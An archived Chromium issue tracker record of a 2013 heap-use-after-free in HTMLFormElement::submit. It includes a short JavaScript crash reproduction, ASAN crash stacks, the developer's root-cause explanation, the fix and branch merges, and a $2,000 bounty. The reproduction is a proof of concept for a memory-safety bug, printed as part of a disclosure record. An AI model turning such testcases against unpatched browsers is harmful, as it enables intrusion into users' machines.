# Heap-use-after-free in WebCore::HTMLFormElement::submit

| Field | Value |
|-------|-------|
| **Issue ID** | [40078151](https://issues.chromium.org/issues/40078151) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Forms |
| **Reporter** | cl...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2013-09-24 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of chrome.

Requires --expose-gc

**VERSION**  

Chrome Version: asan-symbolized-linux-release-224738  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o179=document.createElement('form');
o180=document.createElement('input');
o180.type='submit';
o179.addEventListener('submit', cb\_trigger\_onsubmit\_25\_1,false);
o179.action='javascript:gc()';
o179.appendChild(o180);
o180.click();
}
function cb\_trigger\_onsubmit\_25\_1() {
o179.removeChild(o180);
o179=null;
}
window.setTimeout("start()", 100);
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: See attached stack.txt for ASAN output

## Attachments

- [stack.txt](attachments/stack.txt) (text/plain; charset=us-ascii, 18.9 KB)

## Timeline

### cl...@chromium.org (2013-09-24)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5045782138847232

### cl...@chromium.org (2013-09-24)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5045782138847232

Uploader: ianbeer@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 1
Crash Address: 0x61300002bd42
Crash State:
  - crash stack -
  WebCore::HTMLFormElement::submit
  WebCore::HTMLFormElement::prepareForSubmission
  - free stack -
  WebCore::FormSubmission::~FormSubmission
  WebCore::HTMLFormElement::submit
  

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96ZmNd-a02H1IgRrG9sIWBrhrJ-NNSFR3Q6YENBKS5PkiLvSKScQlng9u1a_DT_HLLaeiIhcPP48C8GfvHdAS4gX-Q_vvo12WgLV-VLpyt7FoM6TpUMXFmv3TWZYWcJjZldpCN5so6lgOqwECVhRzvOHQ3iiQ



### ia...@chromium.org (2013-09-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-24)

ClusterFuzz thinks that this bug might be eligible for a reward! Forwarding to reward panel for consideration.

### cl...@chromium.org (2013-09-24)

Adding milestone and impact labels.

### jw...@chromium.org (2013-09-25)

Kent, this looks like it touches a bunch of HTMLInputElement stuff. Can you take a look? Thanks!

FYI, you're definitely going to need --js-flags="--expose-gc" and ASAN for the repro.

### in...@chromium.org (2013-09-25)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### tk...@chromium.org (2013-09-27)

[Empty comment from Monorail migration]

### tk...@chromium.org (2013-09-27)

> o179.addEventListener('submit', cb_trigger_onsubmit_25_1,false);
> function cb_trigger_onsubmit_25_1() {
>     o179.removeChild(o180);
>     o179=null;
> }

Only removing a FORM element from the document tree in a submit event handler doesn't make a problem because an Event object still has a reference to the FORM element, and the event object lives until next GC.

> o179.action='javascript:gc()';

Unfortunately we have another chance to execute JavaScript. This gc() deletes the event object, and referred FORM element.


### bu...@chromium.org (2013-09-27)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=158428

------------------------------------------------------------------------
r158428 | tkent@chromium.org | 2013-09-27T08:13:50.253600Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/html/HTMLFormElement.cpp?r1=158428&r2=158427&pathrev=158428
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/forms/form-submission-crash.html?r1=158428&r2=158427&pathrev=158428
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/forms/form-submission-crash-expected.txt?r1=158428&r2=158427&pathrev=158428

Fix a crash in HTMLFormElement::prepareForSubmission.

BUG=297478
TEST=automated with ASAN.

Review URL: https://chromiumcodereview.appspot.com/24910003
------------------------------------------------------------------------

### aa...@google.com (2013-09-27)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-27)

Adding Merge-Approved to track merges across stable and beta branches. Please do not merge without checking with the release manager first. If the fix is not applicable for merge, change this label to Merge-NA.

### cl...@chromium.org (2013-09-27)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-30)

ClusterFuzz has detected this issue as fixed in range 225895:225905.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5045782138847232

Uploader: ianbeer@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 1
Crash Address: 0x61300002bd42
Crash State:
  - crash stack -
  WebCore::HTMLFormElement::submit
  WebCore::HTMLFormElement::prepareForSubmission
  - free stack -
  WebCore::FormSubmission::~FormSubmission
  WebCore::HTMLFormElement::submit
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=225895:225905

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96ZmNd-a02H1IgRrG9sIWBrhrJ-NNSFR3Q6YENBKS5PkiLvSKScQlng9u1a_DT_HLLaeiIhcPP48C8GfvHdAS4gX-Q_vvo12WgLV-VLpyt7FoM6TpUMXFmv3TWZYWcJjZldpCN5so6lgOqwECVhRzvOHQ3iiQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### aa...@google.com (2013-10-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-10-02)

Migrating old milestone labels.

### ka...@google.com (2013-10-04)

pls merge to M30 - branch 1599 and then switch mstone to 31 and re-request merge. ty.

### tk...@chromium.org (2013-10-07)

[Empty comment from Monorail migration]

### la...@google.com (2013-10-07)

[Empty comment from Monorail migration]

### tk...@chromium.org (2013-10-08)

M30: http://src.chromium.org/viewvc/blink?view=revision&revision=158998
M31: http://src.chromium.org/viewvc/blink?view=revision&revision=159067



### bu...@chromium.org (2013-10-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=158998

------------------------------------------------------------------------
r158998 | tkent@chromium.org | 2013-10-07T00:23:53.878814Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/html/HTMLFormElement.cpp?r1=158998&r2=158997&pathrev=158998
   A http://src.chromium.org/viewvc/blink/branches/chromium/1599/LayoutTests/fast/forms/form-submission-crash.html?r1=158998&r2=158997&pathrev=158998
   A http://src.chromium.org/viewvc/blink/branches/chromium/1599/LayoutTests/fast/forms/form-submission-crash-expected.txt?r1=158998&r2=158997&pathrev=158998

Merge 158428 "Fix a crash in HTMLFormElement::prepareForSubmission."

> Fix a crash in HTMLFormElement::prepareForSubmission.
> 
> BUG=297478
> TEST=automated with ASAN.
> 
> Review URL: https://chromiumcodereview.appspot.com/24910003

TBR=tkent@chromium.org

Review URL: https://codereview.chromium.org/26200002
------------------------------------------------------------------------

### bu...@chromium.org (2013-10-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=159067

------------------------------------------------------------------------
r159067 | tkent@chromium.org | 2013-10-08T00:23:20.774285Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/fast/forms/form-submission-crash-expected.txt?r1=159067&r2=159066&pathrev=159067
   M http://src.chromium.org/viewvc/blink/branches/chromium/1650/Source/core/html/HTMLFormElement.cpp?r1=159067&r2=159066&pathrev=159067
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/fast/forms/form-submission-crash.html?r1=159067&r2=159066&pathrev=159067

Merge 158428 "Fix a crash in HTMLFormElement::prepareForSubmission."

> Fix a crash in HTMLFormElement::prepareForSubmission.
> 
> BUG=297478
> TEST=automated with ASAN.
> 
> Review URL: https://chromiumcodereview.appspot.com/24910003

TBR=tkent@chromium.org

Review URL: https://codereview.chromium.org/26317004
------------------------------------------------------------------------

### mb...@google.com (2013-10-09)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-10-12)

$2000 since there is control between the free and use, but it is inside the node heap partition.

### pa...@chromium.org (2013-10-18)

OK, kicked off payment for this one (and the rest). Expect something in a few weeks. Thanks again cloudfuzzer :)

### cl...@chromium.org (2013-11-13)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-12-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/297478?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078151)*
